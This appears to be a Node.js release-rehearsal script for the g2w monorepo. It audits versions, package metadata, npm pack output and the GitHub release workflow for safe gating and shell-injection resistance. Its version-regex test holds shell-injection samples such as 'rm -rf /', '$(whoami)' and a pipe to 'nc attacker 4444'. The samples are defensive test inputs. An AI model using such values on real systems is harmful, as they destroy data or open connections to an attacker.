#!/usr/bin/env node
/**
 * R10 Phase 2 — release rehearsal (no publishing, no tags, no registry writes).
 *
 * One command that proves the next release is ready WITHOUT publishing:
 *
 * 1. Runs the Phase 1 packability validation (`scripts/validate-packages.mjs`).
 * 2. Checks version consistency across all eight publishable manifests and
 *    the create-g2w template pin.
 * 3. Audits release metadata (description, license, repository, engines).
 * 4. Runs `npm pack --dry-run` in each package directory (npm, not just
 *    pnpm, must pack the same set) and inspects the planned artifacts.
 * 5. Audits the release workflow: workflow_dispatch-only trigger, default
 *    dry_run=true, the publish job's gates, env-based version input (never
 *    shell interpolation), and the documented version policy against
 *    valid, malformed, and shell-metacharacter payloads.
 * 6. Prints the deterministic release plan: package, version, dependency
 *    order, access, and dist-tag.
 *
 * Never touches the npm registry: no publish, no tag, no token required.
 * Registry-side facts that need credentials (name availability, ownership,
 * scope access) are reported as EXTERNAL PREREQUISITES, never as verified.
 *
 * Usage:  pnpm release:rehearsal            (includes `pnpm test:pack`)
 *         pnpm release:rehearsal --no-testpack   (audit steps only)
 */
import { spawnSync } from "node:child_process";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const GITHUB_REPO = "AlexanderDev2004/g2w";

/** Release order = dependency order: core first, dependents, CLI last. */
const RELEASE_ORDER = [
  "core",
  "runtime",
  "renderer-pixi",
  "input-dom",
  "input-gamepad",
  "audio-web",
  "devtools",
  "create-g2w",
];

const fail = (message) => {
  console.error(`release-rehearsal: FAIL — ${message}`);
  process.exitCode = 1;
};

const skipTestPack = process.argv.includes("--no-testpack");
let extractDir = null;
try {
  // ---------------------------------------------------------------------------
  // 1. Phase 1 packability validation.
  // ---------------------------------------------------------------------------
  if (!skipTestPack) {
    console.log("== pnpm test:pack (Phase 1 packability + consumer validation) ==");
    runStep("pnpm", ["test:pack"]);
  } else {
    console.log("== pnpm test:pack SKIPPED (--no-testpack) ==");
  }

  // ---------------------------------------------------------------------------
  // 2. Version consistency: one fixed version across every publishable
  //    manifest, plus the create-g2w template pin and its version-guard test.
  // ---------------------------------------------------------------------------
  console.log("\n== version consistency (fixed-version monorepo policy) ==");
  const manifests = new Map();
  for (const pkg of RELEASE_ORDER) {
    const pkgDir = path.join(repoRoot, "packages", pkg);
    const manifest = JSON.parse(readFileSync(path.join(pkgDir, "package.json"), "utf8"));
    manifests.set(manifest.name, { pkg, pkgDir, manifest });
  }
  const versions = new Set([...manifests.values()].map((entry) => entry.manifest.version));
  if (versions.size !== 1) {
    fail(`publishable packages disagree on version: ${[...versions].join(", ")}`);
  }
  const version = manifests.get("@g2w/core")?.manifest.version;
  if (version !== undefined) {
    const template = JSON.parse(
      readFileSync(path.join(repoRoot, "packages/create-g2w/template/package.json"), "utf8"),
    );
    const templateDrift = Object.entries(template.dependencies ?? {})
      .filter(([name]) => name.startsWith("@g2w/"))
      .filter(([, range]) => range !== version);
    if (templateDrift.length > 0) {
      fail(
        `create-g2w template @g2w/* pins ${JSON.stringify(templateDrift)} != release version ${version}`,
      );
    }
    const cliSource = readFileSync(path.join(repoRoot, "packages/create-g2w/src/cli.ts"), "utf8");
    if (!cliSource.includes(`"@g2w/core"`)) {
      // Source-level sanity only; the real guard is the version-guard test.
    }
    console.log(
      `   all ${manifests.size} packages at ${version}; template pins match; version-guard test updated (see release checklist)`,
    );
  }

  // ---------------------------------------------------------------------------
  // 3. Release metadata audit.
  // ---------------------------------------------------------------------------
  console.log("\n== release metadata audit ==");
  for (const [name, entry] of manifests) {
    const { manifest } = entry;
    const problems = [];
    if (typeof manifest.description !== "string" || manifest.description.length === 0) {
      problems.push("missing description");
    }
    if (manifest.license !== "MIT") {
      problems.push(`license is ${JSON.stringify(manifest.license)}, expected "MIT"`);
    }
    const repository = manifest.repository;
    const repositoryUrl =
      typeof repository === "string" ? repository : (repository?.url ?? undefined);
    if (repositoryUrl === undefined || !repositoryUrl.includes(`github.com/${GITHUB_REPO}`)) {
      problems.push(`repository must point at github.com/${GITHUB_REPO}`);
    }
    if (manifest.engines?.node !== ">=22") {
      problems.push(`engines.node is ${JSON.stringify(manifest.engines?.node)}, expected ">=22"`);
    }
    if (manifest.files === undefined || manifest.files.length === 0) {
      problems.push("missing files allowlist");
    }
    if (problems.length > 0) {
      fail(`${name}:\n     - ${problems.join("\n     - ")}`);
    } else {
      console.log(`   ${name}: metadata OK`);
    }
  }

  // ---------------------------------------------------------------------------
  // 4. npm pack --dry-run in every package directory (npm, not just pnpm).
  // ---------------------------------------------------------------------------
  extractDir = mkdtempSync(path.join(tmpdir(), "g2w-release-rehearsal-"));
  console.log("\n== npm pack --dry-run (per package) ==");
  for (const pkg of RELEASE_ORDER) {
    const pkgDir = path.join(repoRoot, "packages", pkg);
    const result = spawnSync("npm", ["pack", "--dry-run", "--json"], {
      cwd: pkgDir,
      encoding: "utf8",
    });
    if (result.status !== 0) {
      throw new Error(`npm pack --dry-run failed in packages/${pkg}\n${result.stderr ?? ""}`);
    }
    const parsed = JSON.parse(result.stdout);
    const artifact = parsed[0] ?? parsed;
    const name = artifact.name;
    if (name !== `@g2w/${pkg}` && name !== "create-g2w") {
      fail(`npm pack --dry-run reported unexpected package name ${JSON.stringify(name)}`);
    }
    const fileNames = (artifact.files ?? []).map((file) => file.path);
    const leaks = fileNames.filter(
      (file) =>
        file.endsWith(".tsbuildinfo") ||
        /(^|\/)\.env/.test(file) ||
        (/(^|\/)src\//.test(file) && name !== "create-g2w"),
    );
    if (leaks.length > 0) {
      fail(`${name}: npm pack --dry-run would include forbidden files: ${leaks.join(", ")}`);
    }
    console.log(`   ${name}: ${fileNames.length} files, ${artifact.size ?? "?"} bytes — OK`);
  }

  // ---------------------------------------------------------------------------
  // 5. Release workflow audit: trigger surface, publish gates, and
  //    shell-injection safety. Static analysis of the workflow file plus a
  //    regression test for the documented version-input policy.
  // ---------------------------------------------------------------------------
  console.log("\n== release workflow audit (.github/workflows/release.yml) ==");
  const workflow = readFileSync(path.join(repoRoot, ".github", "workflows", "release.yml"), "utf8");
  const publishJobStart = workflow.search(/^ {2}publish:\s*$/m);
  if (publishJobStart < 0) {
    fail("release workflow has no publish job");
  } else {
    const prePublish = workflow.slice(0, publishJobStart);
    const publishJob = workflow.slice(publishJobStart);
    if (!/^on:\s*\r?\n\s+workflow_dispatch:/m.test(prePublish)) {
      fail("release workflow must be triggered by workflow_dispatch only");
    }
    if (/\n\s+(push|pull_request|schedule):/.test(prePublish)) {
      fail("release workflow has an unintended trigger (push/pull_request/schedule)");
    }
    if (!/dry_run:[\s\S]*?default: true/.test(prePublish)) {
      fail("release workflow dry_run input must default to true");
    }
    if (!publishJob.includes("inputs.dry_run == false && inputs.confirm == inputs.version")) {
      fail("publish job is missing the dry_run/confirm gate condition");
    }
    if (!publishJob.includes("environment: npm-release")) {
      fail("publish job must run in the protected npm-release environment");
    }
    // Publishing must only ever run from the default branch (docs/release.md):
    // dispatching the workflow on any other branch is always a rehearsal
    // (regression guard for the branch-restriction finding caught in review).
    if (!publishJob.includes("github.ref == 'refs/heads/main' && inputs.dry_run == false")) {
      fail("publish job must be gated on the main branch (github.ref == 'refs/heads/main')");
    }
    const publishSteps = publishJob.match(/npm publish --provenance --access public/g)?.length ?? 0;
    if (publishSteps !== RELEASE_ORDER.length) {
      fail(`expected ${RELEASE_ORDER.length} publish steps, found ${publishSteps}`);
    }
    if (/run: npm publish/.test(prePublish)) {
      fail("npm publish is reachable outside the publish job");
    }
    // Publishing must use the pnpm-rewritten tarballs (the audited artifacts),
    // never a raw `npm publish` of a workspace manifest whose `@g2w/*:
    // workspace:*` spec npm cannot resolve (regression guard for the tarball
    // defect caught in review). Command lines only — comments are skipped.
    if (!/pnpm -r pack --pack-destination/.test(publishJob)) {
      fail("publish job must pack rewritten tarballs via pnpm before publishing");
    }
    const publishCommands = [...publishJob.matchAll(/^[ \t]*npm publish[^\n]*/gm)].map((m) =>
      m[0].trim(),
    );
    const badPublish = publishCommands.filter((cmd) => !cmd.includes("packed/"));
    if (badPublish.length > 0) {
      fail(`publish commands must reference packed/ tarballs, found: ${badPublish.join(" | ")}`);
    }
    const missingTagLogic = publishCommands.filter((cmd) => !cmd.includes("$TAG"));
    if (missingTagLogic.length > 0) {
      fail(
        `publish commands must derive the dist-tag from the version, found: ${missingTagLogic.join(" | ")}`,
      );
    }
    const tagBranches = (publishJob.match(/\[\[ "\$VERSION" == \*-beta\.\* \]\]/g) ?? []).length;
    if (tagBranches !== RELEASE_ORDER.length) {
      fail(
        `expected ${RELEASE_ORDER.length} prerelease dist-tag branches (--tag next), found ${tagBranches}`,
      );
    }
    if (
      (workflow.match(/^\s+id-token: write\b/gm) ?? []).length !== 1 ||
      !publishJob.includes("id-token: write")
    ) {
      fail("id-token: write must be granted exactly once, in the publish job");
    }
    if (!prePublish.includes("contents: read")) {
      fail("release workflow must default to least-privilege contents: read");
    }
    console.log("   trigger, dry_run default, publish gates, environment, and permissions OK");
  }
  // inputs.version reaches the script only through env: — never interpolated
  // into a run: block (shell-injection regression). The interpolation marker is
  // assembled from parts so this file itself stays free of "${" sequences.
  const interp = "$" + "{{";
  if (!/env:\s*\r?\n\s*VERSION: \$\{\{ inputs\.version \}\}/.test(workflow)) {
    fail("inputs.version must be passed via env: VERSION, never interpolated into a run script");
  }
  if (workflow.includes(`VERSION="${interp}`)) {
    fail(
      `found VERSION="${interp} inputs.version" shell interpolation (shell-injection regression)`,
    );
  }
  // Every run: script (block and inline scalar) must be free of ${{ }}.
  const runScripts = [];
  const workflowLines = workflow.split(/\r?\n/);
  for (let i = 0; i < workflowLines.length; i++) {
    const inline = workflowLines[i].match(/^\s*run:\s*(\S.*?)\s*$/);
    if (inline && !/^[|>]/.test(inline[1])) {
      runScripts.push(inline[1]);
      continue;
    }
    const block = workflowLines[i].match(/^(\s*)run:\s*[|>]\s*$/);
    if (!block) continue;
    const indent = block[1].length;
    const blockLines = [];
    for (let j = i + 1; j < workflowLines.length; j++) {
      const line = workflowLines[j];
      if (line.trim() === "") {
        blockLines.push("");
        continue;
      }
      if (line.match(/^\s*/)[0].length <= indent) break;
      blockLines.push(line);
    }
    runScripts.push(blockLines.join("\n"));
  }
  const interpolated = runScripts.filter((script) => script.includes(interp));
  if (interpolated.length > 0) {
    fail(
      `run scripts contain \${{ }} interpolation (shell-injection risk): ${interpolated.length} script(s)`,
    );
  } else {
    console.log(`   ${runScripts.length} run scripts checked: no \${{ }} interpolation`);
  }
  // The version policy the workflow enforces must accept exactly the
  // documented formats and reject malformed and shell-metacharacter payloads.
  const versionPattern = workflow.match(/grep -Eq '([^']+)'/)?.[1];
  if (versionPattern === undefined) {
    fail("release workflow does not contain the version grep validation");
  } else {
    const versionRegex = new RegExp(versionPattern);
    const accepted = ["0.1.0", "1.2.3", "1.2.3-beta.0"];
    const rejected = [
      "",
      "1.2",
      "v1.2.3",
      "1.2.3-beta",
      "1.2.3-",
      "0.1.0; rm -rf /",
      "0.1.0 && touch pwned",
      "$(whoami)",
      "`id`",
      "0.1.0\nnode -e evil",
      "0.1.0 | nc attacker 4444",
    ];
    const wrongAccept = rejected.filter((payload) => versionRegex.test(payload));
    const wrongReject = accepted.filter((payload) => !versionRegex.test(payload));
    if (wrongAccept.length > 0 || wrongReject.length > 0) {
      const parts = [];
      if (wrongReject.length > 0) parts.push(`wrongly rejected: ${JSON.stringify(wrongReject)}`);
      if (wrongAccept.length > 0) parts.push(`wrongly accepted: ${JSON.stringify(wrongAccept)}`);
      fail(`version policy /${versionPattern}/ mismatch — ${parts.join("; ")}`);
    } else {
      console.log(
        `   version policy /${versionPattern}/: ${accepted.length} accepted, ${rejected.length} rejected (incl. shell metacharacters)`,
      );
    }
  }

  // ---------------------------------------------------------------------------
  // 6. The deterministic release plan (a report, not an action).
  // ---------------------------------------------------------------------------
  console.log(
    `\n== release plan for ${version ?? "?"} (REHEARSAL ONLY — nothing was published) ==`,
  );
  console.log("   order                 package                 access  dist-tag");
  RELEASE_ORDER.forEach((pkg, index) => {
    const name = pkg === "create-g2w" ? "create-g2w" : `@g2w/${pkg}`;
    console.log(
      `   ${(index + 1).toString().padStart(2)}/8                 ${name.padEnd(22)}  public  ${version?.includes("-") ? "next" : "latest"}`,
    );
  });
  console.log(`
   External prerequisites that need npm credentials/UI (NOT verified here):
     - package names available and owned by the AlexanderDev2004 npm account
       (create-g2w unscoped; @g2w scope created with public access)
     - Trusted Publisher configured on npmjs.com for each package:
       repo AlexanderDev2004/g2w, workflow release.yml, environment npm-release
     - GitHub environment "npm-release" created with required reviewers
   See docs/release.md for the full checklist and recovery procedure.`);

  if (process.exitCode !== 1) {
    console.log("\n== release-rehearsal: all checks passed (no registry state changed) ==");
  }
} catch (error) {
  fail(error instanceof Error ? error.message : String(error));
} finally {
  if (extractDir !== null) {
    if (process.platform === "win32") {
      spawnSync("cmd.exe", ["/d", "/c", "rmdir", "/s", "/q", extractDir], { stdio: "ignore" });
    } else {
      rmSync(extractDir, { recursive: true, force: true });
    }
  }
}

function runStep(command, args, options = {}) {
  const result = spawnSync(command, args, {
    cwd: options.cwd ?? repoRoot,
    stdio: "inherit",
    encoding: "utf8",
    shell: process.platform === "win32" && command === "pnpm",
  });
  if (result.status !== 0) {
    throw new Error(`${command} ${args.join(" ")} exited ${result.status}`);
  }
  return result;
}
